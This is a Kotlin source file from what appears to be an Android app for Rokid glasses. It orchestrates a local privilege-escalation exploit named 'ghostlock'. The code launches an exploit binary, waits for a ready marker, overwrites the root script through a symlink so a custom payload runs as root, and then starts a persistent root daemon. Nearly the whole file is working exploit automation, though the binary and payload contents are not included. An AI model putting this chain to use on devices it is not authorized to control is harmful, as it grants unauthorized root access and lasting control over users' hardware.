package com.rokid.rc.glasses.ghost

import android.content.Context
import com.rokid.rc.shared.protocol.GhostlockCodes
import com.rokid.rc.shared.protocol.ProgressCodec
import com.rokid.rc.shared.protocol.ProgressEvent
import android.os.SystemClock
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * ghostlock LPE 觸發層（直連版）。
 *
 * 在 App 內以 ProcessBuilder 執行 [ExploitConfig.binaryPath]，並完整重現
 * run_*_orchestrator.sh 的既有流程：
 *
 *   1. launch  — 啟動 exploit（帶 env，輸出重導到 app cache 的 exploitLog）
 *   2. ready   — 輪詢 rootScriptPath 出現 readyMarker（證明 write_root_script() 已跑）
 *   3. install — 以原子 rename 把自訂 payload 置換進 rootScriptPath
 *   4. done    — 輪詢 payloadLog 出現 doneMarker（payload 已以 root 執行完畢）
 *   5. cleanup — 回收 exploit 行程
 *
 * 前置條件：App 需能 read/exec `binaryPath`，且能寫 `rootScriptPath`（即對
 * `/data/local/tmp` 的存取權）。若 App 身分（`u:r:untrusted_app`）不具此權限，
 * 會在 READY / INSTALL 階段明確回報；屆時需改走「root 橋接 daemon」方案
 * （見 docs/architecture.md §5）。
 */
class ShellGhostlockEngine(
    private val context: Context,
    private val config: ExploitConfig = ExploitConfig()
) : GhostlockEngine {

    private val payloadLog = GhostlockPaths.payloadLog(context)
    private val exploitLog = GhostlockPaths.exploitLog(context)

    @Volatile
    override var isEnabled: Boolean = false
        private set

    override fun setEnabled(enabled: Boolean) {
        isEnabled = enabled
    }

    override fun doneLog(): File = payloadLog

    override var onProgress: ((ProgressEvent) -> Unit)? = null

    @Volatile
    override var rootAcquired: Boolean = false
        private set

    override suspend fun acquireRoot(): ExecResult {
        // 若已有常駐 root daemon（uid=0），跳過重跑 exploit，避免無謂的 reboot 風險
        val client = RootDaemonClient()
        if (client.isRoot()) {
            rootAcquired = true
            progress(GhostlockCodes.SKIP_LPE)
            return ExecResult.ok(Stage.DONE, "already rooted")
        }
        val result = exec(LedPayloads.startRootDaemon(doneLog()))
        rootAcquired = result.success
        return result
    }

    override suspend fun exec(payload: RootScript): ExecResult = withContext(Dispatchers.IO) {
        // 0. preflight
        val binary = File(config.binaryPath)
        if (!binary.exists() || !binary.canExecute()) {
            return@withContext ExecResult.fail(
                Stage.PREFLIGHT,
                ProgressCodec.encode(GhostlockCodes.BINARY_MISSING, binary.absolutePath)
            )
        }

        payloadLog.delete()
        exploitLog.delete()

        // 1. launch
        progress(GhostlockCodes.EXPLOIT_STARTED)
        val proc = startExploit()
            ?: return@withContext ExecResult.fail(Stage.LAUNCH, ProgressCodec.encode(GhostlockCodes.EXPLOIT_START_FAILED, exploitLog.absolutePath))

        try {
            // 2. ready
            progress(GhostlockCodes.WAIT_READY)
            if (!waitFor(config.readyTimeoutMs) { readySeen() }) {
                return@withContext ExecResult.fail(
                    Stage.READY,
                    ProgressCodec.encode(GhostlockCodes.READY_TIMEOUT, config.rootScriptPath + " / " + config.readyMarker)
                )
            }

            // 3. install payload
            progress(GhostlockCodes.PAYLOAD_REPLACED)
            if (!installPayload(payload)) {
                return@withContext ExecResult.fail(
                    Stage.INSTALL,
                    ProgressCodec.encode(GhostlockCodes.PAYLOAD_WRITE_FAILED, config.rootScriptPath)
                )
            }

            // 4. done
            progress(GhostlockCodes.WAIT_PAYLOAD)
            if (!waitFor(config.doneTimeoutMs) { doneSeen() }) {
                return@withContext ExecResult.fail(
                    Stage.DONE,
                    ProgressCodec.encode(GhostlockCodes.PAYLOAD_TIMEOUT, readTail(payloadLog, 800))
                )
            }

            return@withContext ExecResult.ok(Stage.DONE, readTail(payloadLog, 4000))
        } finally {
            destroy(proc)
        }
    }

    // ---- internals ----

    private fun startExploit(): Process? = try {
        ProcessBuilder(config.binaryPath)
            .directory(context.cacheDir)
            .redirectErrorStream(true)
            .redirectOutput(exploitLog)
            .apply {
                val env = environment()
                config.env.forEach { kv ->
                    val parts = kv.split("=", limit = 2)
                    env[parts[0]] = parts.getOrElse(1) { "" }
                }
            }
            .start()
    } catch (e: Exception) {
        Log.e(TAG, "startExploit failed", e)
        null
    }

    private fun readySeen(): Boolean = try {
        File(config.rootScriptPath).readText().contains(config.readyMarker)
    } catch (e: Exception) {
        false
    }

    private fun installPayload(payload: RootScript): Boolean = try {
        val target = File(config.rootScriptPath)
        // 直接寫入（若 rootScriptPath 是 symlink 到可寫目錄，會 follow symlink 寫入目標，
        // 這樣 untrusted_app 也能置換 payload，無需 shell helper）
        target.writeText(payload.content)
        target.setExecutable(true, false)
        true
    } catch (e: Exception) {
        Log.e(TAG, "installPayload failed", e)
        false
    }

    private fun doneSeen(): Boolean =
        payloadLog.exists() && payloadLog.readText().contains(config.doneMarker)

    private fun waitFor(timeoutMs: Long, cond: () -> Boolean): Boolean {
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (SystemClock.elapsedRealtime() < deadline) {
            if (cond()) return true
            Thread.sleep(config.pollIntervalMs)
        }
        return cond() // 最後一次機會
    }

    private fun destroy(proc: Process) {
        try {
            proc.destroyForcibly()
            proc.waitFor(2, TimeUnit.SECONDS)
        } catch (_: Exception) {
        }
    }

    private fun readTail(file: File, max: Int): String = try {
        if (!file.exists()) "(none)" else file.readText().takeLast(max)
    } catch (e: Exception) {
        "(unreadable)"
    }

    companion object {
        private const val TAG = "ShellGhostlockEngine"
    }
}
